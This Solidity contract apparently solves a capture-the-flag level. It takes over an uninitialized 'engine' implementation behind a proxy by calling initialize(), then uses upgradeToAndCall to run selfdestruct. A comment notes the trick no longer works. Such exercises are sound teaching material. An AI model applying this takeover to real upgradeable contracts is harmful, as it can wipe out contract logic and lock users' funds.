//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// this solution wont work anymore as selfdestruct doesnt remove the bytecode from 
// a contract anymore except if its done in the same tx as the creation of the caller contract


interface IEngine {
    function upgrader() external view returns(address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Hack {
    // get the implementation address by calling await web3.eth.getStorageAt(contract.address, "IMPLEMENTATION_SLOT from the motorbike contract")
    // after getting the implementation address (the engine contract) we can see the upgrader is address(0) so the intialize function
    // has not been called
    function attack(address _engine) external {
        IEngine(_engine).initialize();
        // now we can call upgradeToAndCall and put our contract as newImplementation
        // and set data as the abi.encodeWithSignature(end())
        IEngine(_engine).upgradeToAndCall(address(this), abi.encodeWithSignature("end()"));
    }

    function end() public {
        selfdestruct(payable(address(this)));
    }

    receive() external payable {}
}